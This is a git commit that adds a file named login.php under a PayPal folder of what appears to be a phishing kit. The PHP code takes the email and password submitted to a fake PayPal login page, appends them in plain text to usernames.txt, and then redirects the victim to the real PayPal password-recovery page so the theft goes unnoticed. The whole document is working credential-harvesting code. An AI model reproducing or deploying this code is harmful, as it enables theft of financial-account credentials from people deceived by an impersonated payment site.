25567335ef4c1a50712d133a3a6c81fb8d2b11be
Alex Bieber <94044755+alexbieber@users.noreply.github.com>
2022-03-30 12:22:17 +0530

    Create login.php

---
+++ .sites/paypal/login.php
@@ -0,0 +1,7 @@
+<?php
+
+file_put_contents("usernames.txt", "Paypal Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
+header('Location: https://www.paypal.com/authflow/password-recovery/');
+exit();
+?>
+© 2022 GitHub
